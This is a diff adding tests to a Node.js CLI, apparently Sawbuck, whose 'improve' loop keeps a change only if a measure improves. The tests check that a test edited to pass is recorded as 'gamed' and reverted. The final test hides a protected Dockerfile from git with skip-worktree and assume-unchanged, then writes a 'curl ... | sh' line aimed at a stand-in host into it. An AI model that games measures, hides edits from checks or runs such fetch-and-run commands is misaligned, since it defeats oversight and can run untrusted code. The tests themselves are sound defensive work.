@@ -1396,3 +1396,121 @@ test('check --base over several commits notes the tests an earlier commit added 
     assert.doesNotMatch(last.stdout, /an earlier commit of this change/, 'one commit has no earlier commit');
   } finally { rmSync(d, { recursive: true, force: true }); }
 });
+
+// ---- The wheel in Sawbuck (proof-bench/wheel/PLAN.md, 2026-11-21) -------------------------------------------------------
+// The engine's loop and its record were never reachable from Sawbuck: no command ran `improve` and nothing read the
+// record. The hooks' checks did write the engine's rows until the engine dropped the record in 0.8.0; a person's
+// `sawbuck check` never did.
+const calcRepo = () => {
+  const { d, g } = tmpRepo();
+  writeFileSync(join(d, 'package.json'), '{"name":"w","version":"1.0.0","scripts":{"test":"node --test"}}\n');
+  mkdirSync(join(d, 'src')); mkdirSync(join(d, 'test'));
+  writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a-b\n');
+  writeFileSync(join(d, 'test/calc.test.js'), "const t=require('node:test'),a=require('node:assert');const {add}=require('../src/calc.js')\nt.test('add',()=>a.equal(add(2,2),4))\n");
+  g('add', '-A'); g('commit', '-qm', 'a failing test');
+  return { d, g };
+};
+const sb2 = (args, cwd) => { const r = spawnSync(process.execPath, [CLI, ...args], { cwd, encoding: 'utf8', env: { ...process.env, HOME: TMP_HOME } }); return { code: r.status, out: r.stdout, err: r.stderr }; };
+const wheelRows = (d) => { try { return readFileSync(join(d, '.git', 'promptwheel', 'outcomes.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
+// the loop's own record: one line a try, written by the loop step the engine's improve runs (one keeper, 2026-11-21)
+const loopLines = (d) => { try { return readFileSync(join(d, '.git', 'improve', 'attempts.jsonl'), 'utf8').split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
+
+test('sawbuck improve keeps a change only if it measured better, and playbook, insights and suggest read what the loop did', () => {
+  const { d, g } = calcRepo();
+  try {
+    const base = g('rev-parse', 'HEAD').trim();
+    // a test edited to pass: put back, exit 2
+    let r = sb2(['improve', '--target', 'tests_pass', '--attempt', "sed -i 's/add(2,2),4/add(2,2),0/' test/calc.test.js"], d);
+    assert.equal(r.code, 2, r.out + r.err); assert.equal(g('rev-parse', 'HEAD').trim(), base); assert.equal(porcelain(d), '');
+    // the source fixed: kept as one commit, exit 0
+    r = sb2(['improve', '--goal', 'tests_pass', '--label', 'fix add', '--attempt', "sed -i 's/a-b/a+b/' src/calc.js"], d);
+    assert.equal(r.code, 0, r.out + r.err); assert.equal(g('rev-list', '--count', `${base}..HEAD`).trim(), '1');
+    assert.deepEqual(loopLines(d).map((x) => x.result), ['gamed', 'kept']);
+    assert.ok(wheelRows(d).length >= 2, 'each check the loop asked for is a row in the engine\'s own record');
+    r = sb2(['playbook'], d); assert.equal(r.code, 0, r.err); assert.match(r.out, /## Tried and thrown away/); assert.match(r.out, /moved by changing what it is measured with/);
+    for (const c of ['insights', 'suggest']) assert.equal(sb2([c], d).code, 0, c);
+    assert.equal(JSON.parse(sb2(['insights', '--json'], d).out).kept, 1);
+    r = sb2(['improve'], d); assert.equal(r.code, 64, 'no attempt is a usage error, as in the engine'); assert.match(r.err, /--attempt/);
+    assert.match(sb2(['help', '--all'], d).out, /sawbuck improve --attempt/);
+    assert.match(sb2(['improve', '--help'], d).out, /keep it only if the target improved/);
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
+test('sawbuck improve with no target names the test run: the one measure with no contract, and the one that is not a tripwire in the contract Sawbuck writes', () => {
+  for (const signed of [false, true]) {
+    const { d, g } = calcRepo();
+    try {
+      if (signed) { assert.equal(sb2(['contract'], d).code, 0); g('add', '-A'); g('commit', '-qm', 'contract'); }
+      const r = sb2(['improve', '--attempt', "sed -i 's/a-b/a+b/' src/calc.js"], d);
+      assert.equal(r.code, 0, `${signed ? 'signed' : 'no contract'}: ${r.out}${r.err}`); assert.match(r.out, / kept .*tests_pass 0 to 1/);
+      assert.equal(loopLines(d).pop().target, 'tests_pass');
+    } finally { rmSync(d, { recursive: true, force: true }); }
+  }
+});
+test('sawbuck improve: an attempt that could not run is not a try: exit 64, nothing on the loop\'s record, the tree as it was', () => {
+  const { d, g } = calcRepo();
+  try {
+    const base = g('rev-parse', 'HEAD').trim();
+    const r = sb2(['improve', '--attempt', "sed -i 's/a-b/a+b/' src/calc.js; exit 64"], d);
+    assert.equal(r.code, 64, r.out + r.err); assert.match(r.err, /could not run/);
+    assert.deepEqual(loopLines(d), []); assert.equal(g('rev-parse', 'HEAD').trim(), base); assert.equal(porcelain(d), '');
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
+test('the record is fed by what the hooks check, a look by a person adds no row, and nothing lands in the working tree', () => {
+  const { d, g } = calcRepo();
+  try {
+    writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a+b\n'); g('commit', '-qam', 'fix add');
+    sawbuck(['check'], d);                                                                   // a person looks
+    assert.equal(wheelRows(d).length, 0, 'a look is not an event');
+    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD'], d, { LOGBOOK_NO_CACHE: '1' });   // what a hook runs on a commit
+    const rows = wheelRows(d); assert.equal(rows.length, 1); assert.equal(rows[0].verdict, 'pass'); assert.deepEqual(rows[0].subsystems, ['src']);
+    assert.equal(existsSync(join(d, '.promptwheel')), false, 'no .promptwheel folder in the tree');
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
+test('detach --purge removes the engine\'s record of checked runs too, and a plain detach names it as still on disk', () => {
+  const { d, g } = calcRepo();
+  try {
+    sawbuck(['attach', '--claude'], d);
+    writeFileSync(join(d, 'src/calc.js'), 'exports.add=(a,b)=>a+b\n'); g('commit', '-qam', 'fix add');
+    reflect(['--repo', d, '--base', 'HEAD~1', '--head', 'HEAD'], d, { LOGBOOK_NO_CACHE: '1' });
+    const f = join(d, '.git', 'promptwheel', 'outcomes.jsonl'); assert.ok(existsSync(f), 'a hook check wrote a row');
+    // and a try of the loop: its own record, and the change it tried, kept as a ref
+    sb2(['improve', '--target', 'tests_pass', '--attempt', "echo '// note' >> src/calc.js"], d);
+    const loop = join(d, '.git', 'improve', 'attempts.jsonl'); assert.ok(existsSync(loop), 'the loop wrote its line'); assert.ok(g('for-each-ref', 'refs/improve').trim(), 'and kept the try as a ref');
+    let r = sb2(['detach'], d); assert.equal(r.code, 0, r.err); assert.match(r.out + r.err, /still on disk: .*\.git\/promptwheel\/outcomes\.jsonl/); assert.match(r.out + r.err, /\.git\/improve\/attempts\.jsonl/);
+    assert.ok(existsSync(f), 'a plain detach keeps the record');
+    r = sb2(['detach', '--purge', '--dry-run'], d); assert.equal(r.code, 0, r.err); assert.match(r.out + r.err, /refs\/improve/); assert.ok(existsSync(loop), 'a dry run removes nothing');
+    r = sb2(['detach', '--purge'], d); assert.equal(r.code, 0, r.err); assert.equal(existsSync(f), false, 'the purge removes it');
+    assert.equal(existsSync(join(d, '.git', 'improve')), false, 'and the loop\'s record'); assert.equal(g('for-each-ref', 'refs/improve').trim(), '', 'and the tries it kept as refs');
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
+test('sawbuck improve --turns keeps a fix that takes two turns, and says so in the help', () => {
+  const { d, g } = tmpRepo();
+  try {
+    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ name: 'both', cmd: 'test -f a.js -a -f b.js && grep -q two b.js', extract: 'exit', direction: 'pass', guard: true }] }));
+    g('add', '-A'); g('commit', '-qm', 'a contract with one pass-or-fail measure'); const base = g('rev-parse', 'HEAD').trim();
+    const step = 'if [ ! -f b.js ]; then echo one > b.js; else echo two > b.js; fi';
+    let r = sb2(['improve', '--target', 'both', '--attempt', step], d); assert.equal(r.code, 3, 'judged alone, the first half is put back: ' + r.err); assert.equal(existsSync(join(d, 'b.js')), false);
+    r = sb2(['improve', '--target', 'both', '--turns', '3', '--attempt', step], d);
+    assert.equal(r.code, 0, r.out + r.err); assert.match(r.out, / kept .*both 0 to 1 \(turn 2 of 2\)/); assert.equal(g('rev-list', '--count', `${base}..HEAD`).trim(), '1');
+    assert.match(sb2(['playbook'], d).out, /kept at turn 2 of 2: `both` 0 → 0 → 1/);
+    assert.match(sb2(['improve', '--help'], d).out, /--turns N/);
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
+
+// Held to another session's attack list (2026-11-21): "what is judged cannot touch what judges it". A protected path
+// that a turn hid from git (skip-worktree, assume-unchanged) and then edited was not seen at the end of the turn:
+// git diff and git status say nothing about a hidden file.
+test('a protected path that is hidden from git and then edited is still seen as changed', () => {
+  const { d, g } = tmpRepo();
+  try {
+    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [{ name: 'ok', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }], mandates: [{ name: 'images-frozen', paths: ['Dockerfile*'], reason: 'not an agent decision' }] }));
+    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\n'); g('add', '-A'); g('commit', '-qm', 'a contract that protects the image');
+    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'nothing is changed yet');
+    g('update-index', '--skip-worktree', 'Dockerfile'); g('update-index', '--assume-unchanged', 'Dockerfile');
+    assert.deepEqual(Object.keys(protectedDirty(d)), [], 'hidden, and still as HEAD holds it: not a change');
+    writeFileSync(join(d, 'Dockerfile'), 'FROM node:22\nRUN curl -s https://example.invalid/x | sh\n');
+    assert.equal(porcelain(d), '', 'git status shows nothing: that is the attack');
+    assert.deepEqual(Object.keys(protectedDirty(d)), ['Dockerfile'], 'the check sees it all the same');
+    assert.equal(mandateHits(d, Object.keys(protectedDirty(d)))[0].name, 'images-frozen');
+  } finally { rmSync(d, { recursive: true, force: true }); }
+});
